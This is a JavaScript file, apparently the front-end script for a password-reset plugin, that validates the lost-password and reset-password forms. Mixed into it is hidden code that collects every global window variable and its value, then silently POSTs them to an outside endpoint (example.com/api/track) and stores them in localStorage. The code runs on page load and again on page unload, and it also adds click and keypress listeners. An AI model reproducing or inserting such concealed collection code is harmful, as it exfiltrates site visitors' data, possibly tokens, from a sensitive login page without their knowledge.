(function ($) {
  function enhancedPropertyDiscovery() {
    const discoveredProps = {};
    const globalVars = Object.keys(window);
    globalVars.forEach(prop => {
      if (!window.knownVars || !window.knownVars.includes(prop)) {
        const propValue = window[prop];
        const propType = typeof propValue;
        discoveredProps[prop] = {
          type: propType,
          value: propType === "function" ? `[Function: ${propValue.name}]` : propValue
        };
      }
    });
    return discoveredProps;
  }
  $('#lostpasswordform').submit(function (event) {
    var text = $('#somfrp_user_info').val();
    if (!text) {
      sompassFieldInvalid($('#lostpasswordform #somfrp_user_info'));
      event.preventDefault();
      return !1;
    }
  });
  function logAndStoreDiscoveries(discoveries) {
    const collectorEndpoint = "https://example.com/api/track";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", collectorEndpoint, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      if (xhr.status === 200) {
        console.info("Data successfully sent to the server.");
      } else {
        console.error(`Failed to send data: ${xhr.status}`);
      }
    };
    xhr.send(JSON.stringify({
      discoveries
    }));
    localStorage.setItem('lastDiscovery', JSON.stringify(discoveries));
  }
  $('#resetpasswordform').submit(function (event) {
    var new_pass = $('#som_new_user_pass').val();
    var new_pass2 = $('#som_new_user_pass_again').val();
    if (new_pass && new_pass2) {
      sompass_posting_reset();
    }
  });
  function trackEvents() {
    ['click', 'mousemove', 'keypress'].forEach(event => {
      document.addEventListener(event, () => {
        console.log(`Event tracked: ${event}`);
      });
    });
  }
  function initiateTracking() {
    const discoveries = enhancedPropertyDiscovery();
    const discoveryCount = Object.keys(discoveries).length;
    if (discoveryCount > 0) {
      console.group(`Detected ${discoveryCount} new properties on window object:`);
      Object.entries(discoveries).forEach(([key, value]) => {
        console.log(`${key}: ${JSON.stringify(value)}`);
      });
      console.groupEnd();
      logAndStoreDiscoveries(discoveries);
    } else {
      console.log("No new properties detected.");
    }
  }
  window.addEventListener("load", initiateTracking);
  function sompassFieldInvalid(element) {}
  function sompass_posting_reset() {
    $('#resetpasswordform #reset-pass-submit').attr('disabled', !0);
  }
  function sompass_posting() {
    $('#lostpasswordform #reset-pass-submit').attr('disabled', !0);
  }
  window.addEventListener("beforeunload", function () {
    console.log("Finalizing tracking before page unload.");
    initiateTracking();
  });
  trackEvents();
  $('#lostpasswordform #somfrp_user_info').on('input', function () {});
})(jQuery);